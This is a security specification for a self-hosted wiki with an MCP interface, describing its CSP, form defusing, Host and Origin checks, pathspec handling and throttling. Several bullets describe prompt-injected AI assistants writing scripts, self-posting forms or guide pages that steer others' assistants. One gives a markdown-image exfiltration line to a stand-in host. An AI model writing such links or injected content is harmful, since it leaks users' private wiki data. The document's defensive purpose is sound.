# Security

Part of Zone's spec (see `AGENTS.md` for the index).

How Zone protects the wiki: the login gate, the MCP token, the Host and Origin checks, framing, HTTPS cookies and throttling. Each rule has tests in `tests/test_routes.py` or `tests/test_mcp.py`, and `go/security_test.go`.

- Optional password auth: `./run.sh config passwd` (a hash as `password` in the settings file, `.zone/config`) enables a login gate. If unset, no auth is required. Zone makes a key once and keeps it in `$ZONE_DATA/.zone/secret_key` (mode 0600, listed in `.git/info/exclude` so it never reaches git or a git remote; `secretKey()`), so restarts don't sign anyone out. A wiki folder Zone can't write to gets a new key per start. Routes `/login` (GET/POST) and `/logout` (POST) handle the session; `/welcome/<token>`, an invite or reset link's page, needs no login either (its token is the key: Invite and reset links in `docs/spec/users.md`). A "Sign out" button is rendered in the bottom-right corner when auth is enabled and the visitor is signed in (not on the login page); on phones it sits in the status-badge row at the top, hidden while typing. With `ZONE_ALLOW_REMOTE`, the login page shows the 🌐 remote-access badge in its form's heading row (it has no breadcrumb for the badge to sit beside).
- **Users** (`[user …]` sections in `.zone/config`, `docs/spec/users.md`) replace the one password: each signs in with a name and a password kept only as a PBKDF2 hash; the session cookie names the user and is valid only while they are a user and their password is the one it was signed in with (`passwordStamp`; the wiki's password likewise); a wrong name costs the same time as a wrong password. A wiki password or MCP token together with users refuses to start.
- **The settings file** `.zone/config` holds password hashes and MCP tokens, the tokens only as SHA-256 hashes (`tokenMatches`): it is kept out of git with the rest of `.zone/`, the session key above all, also before a new wiki's first commit (account data stays out of git: The settings file in `docs/spec/users.md`; Zone takes it out of a wiki that committed it, and won't start on a clone whose history has users but no settings file), and Zone never shows it (`canSeePath` is false for `.zone/`, which also holds the editor's texts left in conflict, `.zone/drafts/<user>/`, shown only to their user in their editor: no history view, uncommitted list or MCP tool; `safePath` refuses it to every page route), written owner-only (0600) by `zonewiki user`/`zonewiki config` and the Users tab, and Zone logs a warning when others may read it. A reload with an error keeps the settings from before (a broken edit neither locks everyone out nor opens the wiki), and so does removing the file while Zone runs; `GET /api/health` (no login, for the healthcheck) then answers 503 with the error, which never repeats a password or token, and which it gives only with a session (or in a wiki without a login): it may name users, so without one the answer points to the log. Reloading in `docs/spec/users.md`.
- **Private pages and tasks** (with users, `private/<user>/`, tasks in `private/<user>/_tasks/`, `docs/spec/users.md`): another user's are left out of every list, count and search and are 404 when opened directly, also when they don't exist (`refusePage`; an unknown task id likewise), so nothing tells what is in someone's folder. The rules are `go/access.go` alone (`canSee`, `canWrite`, `canSeePath`, `canSeeTask`); `tests/test_privacy.py` probes every route and MCP tool for leaks, and fails for a new one that isn't probed. Private is hidden inside Zone, not encrypted: the files, git history and a git remote hold everything.
- `/mcp` requires an MCP token, `mcp-token` in the settings file (a bearer token, kept there as its hash; with users, a user's own, and the tools act as that user): without one set it is off (403), whether or not a password is set, because its tools write pages and tasks. Don't make it open again (see Auth in `docs/spec/mcp.md`).
- **Zone's own folders are not served**: `.zone/` (the session key, the settings file, the semantic cache), `.git/`, `_tasks/` and every other folder starting with `_` or `.` hold no pages, and `safePath()` refuses slugs in them, so no page route reads or writes there (Routes in `docs/spec/routes.md`). Uploads are served only from `_assets/` by name (`/_assets/<filename>`, and `/private/<user>/_assets/<filename>` to that user only), the client code only from `public/`.
- The request checks around every route (`checks` in `go/server.go`) first validate the `Host` header (`hostAllowed`) against `allowedHosts` (`localhost`, `127.0.0.1`, `[::1]`) plus the names in `hosts` (the settings file; comma-separated), each at any port (Zone may listen on another, `--addr :8080`) and without case (`hostName`), defeating DNS rebinding attacks (a rebinding page's `Host` is its own name). `ZONE_ALLOW_REMOTE=1` (in `.env`) without `hosts` skips the check (LAN access by IP); with `hosts` set the check stays on. Behind a reverse proxy on the same host, `hosts` alone is enough (the port stays on loopback).
- **Scripts in pages don't run** (`pageCSP`): every response carries a `Content-Security-Policy` with `script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'` (and what a page may load, below). Pages render their raw HTML as written, and pages are also written by AI clients over MCP, which may have read a prompt injection in a mail or a web page: a `<script>`, an `onerror=` handler or a `javascript:` link in a page would otherwise run with the user's session and could read, rewrite or send away the whole wiki. Under `script-src 'self'` without `'unsafe-inline'`/`'unsafe-eval'` only Zone's own script files run (Zone has no inline scripts, `on…=` handlers or `eval`; the browser tests fail on any CSP violation of Zone's own pages, see `docs/spec/testing.md`); this holds in the editor preview and the search preview too, which insert rendered HTML with `innerHTML`. `object-src 'none'`: no plugins; `base-uri 'self'`: no `<base>` that re-points Zone's relative script paths; `form-action 'self'`: no form in a page that posts elsewhere. **No form in a page posts to Zone either** (`defuseHTML` in `go/markdown.go`): such a post is same-origin, so the Origin check lets it through, and one click on a page another user, or an assistant that read a prompt injection, wrote (`<form method=post action="/delete/…">`, a `<button formaction=…>` or `<button form=…>` borrowing one of Zone's own forms) would delete or overwrite the viewer's pages. So in a page's raw HTML, and in task notes and comments, the tags that make or submit a form (`form`, `input`, `button`, `select`, `textarea`, `option`, `optgroup`, `datalist`, `fieldset`, `keygen`, `isindex`) and those that change what the page is (`meta`, a refresh to another site; `base`) show as text: their `<` is escaped. An iframe's `srcdoc` is renamed (`data-defused-srcdoc`), so the frame is empty: it is a document of the page's own origin and policy, and its form would be written with entities (`&lt;form`), which the tag check can't see. It is renamed wherever `srcdoc` is followed by `=` (or ends the raw HTML: what is rendered next may start with the `=`), not only inside what a pattern takes for a tag: a browser ends tags and quoted values by its own rules (in `<iframe a=b' srcdoc=…>` the quote belongs to `a`'s value), and a pattern that read it otherwise let the attribute through. Zone's own checkboxes and controls aren't raw HTML and stay. The rest of a page's HTML (images, links, iframes, styles) stays allowed, as far as it loads from Zone itself (below). `X-Content-Type-Options: nosniff` on every response, so no JSON or text response runs as a script, and uploads not shown inline go out as `application/octet-stream` (`serveUpload`), so an uploaded `.js` can't be loaded by `<script src>` either, as `script-src 'self'` trusts Zone's own origin.
- **Guides are an admin's to write** (with users; `adminsOnly` in `go/access.go`, Guides in `docs/spec/users.md`): `wiki-guide`, a folder's `AGENTS.md`/`CLAUDE.md` and the pages they pull in are what every user's assistant is told to follow, so an editor (or an assistant that read a prompt injection) writing one would steer everyone's.
- **A page's name is never a pattern to git** (`gitEnv` in `go/gitstore.go`): a page may be called anything a file may (`*`, `p?`, `:(glob)**/x`: the editor's routes take the slug as it is), and git reads a path it is handed as a pathspec, where such a name matches other files: `git show <sha> -- '*.md'` is every page's diff, another user's private pages among them, and likewise a page's log, its uncommitted changes and the commit that deleted it. So every git Zone runs has `GIT_LITERAL_PATHSPECS=1` (git's `--literal-pathspecs`): a path names that one file. Two calls turn it off: `grepPages`, whose `*.md` is Zone's own pattern, and `check-ignore`, which takes names as they are and refuses the setting. `tests/test_privacy.py` asks for the history, versions, changes and deleted page of names that match alice's files.
- **A task snapshot's ids and times are checked** (`sanitizeSnapshot` in `go/taskstore.go`; `POST /api/tasks/restore`, `/api/tasks/import`): an `id` or `spawned_from` only of letters, digits, `-` and `_` (at most 64; anything else: a new id, no `spawned_from`), `created_at` and `completed_at` only as `timestamp()` writes them or a day alone (else now), a comment's id likewise (else a new one), and `by` on a comment or history entry only what could be a user's name (else no one). The browser builds the task cards from these, so markup in them would be an element on every user's task list, a form among them (the same one click as a form in a page). The cards escape them as well (`esc()` in `public/js/taskrender.js`): a tasks file written by hand may hold anything.
- **A page loads nothing from other hosts** (`pageCSP`): `default-src 'self'`, with `img-src` and `media-src 'self' data: blob:`, `frame-src 'self'`, `font-src 'self' data:`, `connect-src 'self'`, `style-src 'self' 'unsafe-inline'`. An image, frame, stylesheet or font on another host is a request whose address the page's writer chose, and so a way to send text away with no script at all: an assistant that read a prompt injection writes `![](https://elsewhere.example/?<what it read>)`, and the reader's browser delivers it on opening the page; a frame from elsewhere can show a sign-in form that isn't Zone's. Inline styles stay (a page's own `style=`, KaTeX's, Mermaid's): a `url()` in one is an image, so under `img-src`. **A markdown image on another host is shown as a link to it** (`blockedImage` in `go/markdown.go`: `<a class="external-image">` with the alt text, or the address), not as a broken image; raw HTML naming another host is just not loaded. `<link>` in a page's raw HTML shows as text (`defusedTagRE`): `rel=dns-prefetch` makes the browser look a host name up, which no policy stops. Every response also carries `Referrer-Policy: same-origin`. **`external-content`** (the settings file) names hosts images, media and frames may come from all the same: `upload.wikimedia.org, *.example.org`, or `*` for any, which is how Zone was before (`externalRE`: host names only, so the setting can't add a rule to the policy; `Settings.loadsFrom`). Scripts, styles and fonts never come from elsewhere. Links stay links: following one is the reader's own doing. Tests: `TestProduction` in `tests/test_routes.py`, `test_a_page_asks_no_other_host_for_anything` in `tests/e2e/test_security.py` (whose harness fails on any request to another host).
- **Regexes from AI clients can't hang the server**: `grep_wiki` runs `git grep` in its own process, killed after 10 s; `replace_in_pages` matches with Go's RE2, which takes time linear in the text (no backtracking, so no lookarounds or backreferences). `replace_in_pages` in `docs/spec/mcp.md`.
- **Clickjacking**: `frame-ancestors 'self'` in that policy (added to an existing one, e.g. an SVG upload's sandbox policy) and `X-Frame-Options: SAMEORIGIN` (`pageCSP`), so no other site can frame Zone.
- **Self-hosting behind HTTPS**: the session cookie is `Secure` when the request came over HTTPS, Zone's own or a proxy's `X-Forwarded-Proto: https` (`isHTTPS`); over plain http (localhost, LAN) it works as before. Wrong passwords and wrong MCP tokens are throttled per client (`Throttle`, `loginThrottle`/`mcpThrottle`, in memory): after 5 failures in a row each try waits 1 minute, doubling up to an hour, refused unchecked (429, the login page says how long; `/mcp` sends `Retry-After`); a success clears the client. A client's tries are checked one at a time (`Throttle.try`: the wait, the check and the count as one step), so tries sent at once aren't all let in before the first counts as a failure (a hundred connections were a hundred guesses per wait). The client (`clientKey`) is the remote address, an IPv6 address by its /64 (`network`: a client has that whole network to take addresses from, and each would have five tries of its own), or, when that is a trusted proxy (`trusted-proxies` in the settings file; unset: loopback), the last `X-Forwarded-For` entry that isn't itself a trusted proxy (the one the proxy appended; entries before it are the client's to make up). Anyone else's `X-Forwarded-For` is ignored: a client on the LAN, which reaches Zone without a proxy, could otherwise send a new one with every guess and never be throttled. A peer on a private network that sends the header without being trusted (likely a proxy in a container network, `172.17.0.1`) is named once in the log with the `config set trusted-proxies` that trusts it; until then its clients count as one. Secrets are compared as bytes (`sameSecret`), so non-ASCII passwords work.
- **Request bodies are capped** (`checks`): at most 16 MB (`bodyMax`: a page, a task, an MCP call), an upload (`/api/upload`) 100 MB, or the settings' `upload-max` (`Settings.uploadMax`; reloaded with them, so a change needs no restart). A body over it is refused with 413 (`Too large: at most 16 MB`, the size as `formatSize` writes it) on its `Content-Length`, before it is read; one sent without a length (chunked) is cut at the limit (`http.MaxBytesReader`, `tooLarge`), and the routes that read whole bodies (the page writes, `/mcp`, the preview, the tasks API) answer that with 413 too. Without the cap, one request could fill the server's memory or disk; what the whole wiki may hold is `storage-max` (Storage limit in `docs/spec/users.md`).
- **Cross-site writes are refused** (`crossSite`, checked after the Host check): a POST/PUT/PATCH/DELETE whose `Origin` header names another site, or is `null` (sandboxed iframe), gets 403. Without it any web page could post a form to `localhost:5000` and delete or overwrite pages, or write tasks (the tasks API parses text/plain bodies, which need no CORS preflight), and raw HTML in markdown would turn an overwrite into a stored script. Requests without `Origin` (curl, scripts) are allowed. Behind a reverse proxy the proxy must pass the original `Host` through, or same-origin writes would be refused.
- **No secrets in the repo**: `.env` (tokens, password) is gitignored. The pre-commit hook `.githooks/pre-commit` (on once per clone: `git config core.hooksPath .githooks`) runs gitleaks over the staged changes, with a local gitleaks or else `./run.sh leaks --pre-commit --staged` in the tools image; a leak (exit 3) refuses the commit, a scan that can't run only warns. For `commit -a` and `commit <path>` git hands the hook a temporary index (`GIT_INDEX_FILE`, a host path); `run.sh leaks` passes it into the container as a `/repo/…` path, so those changes are scanned too (an index outside the repo: exit 2, a warning). On the first run `run.sh` says it is building the tools image. In a git worktree only a local gitleaks can check (the container can't follow `.git`'s host path). CI's **leaks** job scans every commit (`./run.sh leaks`). gitleaks is a pinned release, checked against its published checksums in `Containerfile.tools`.
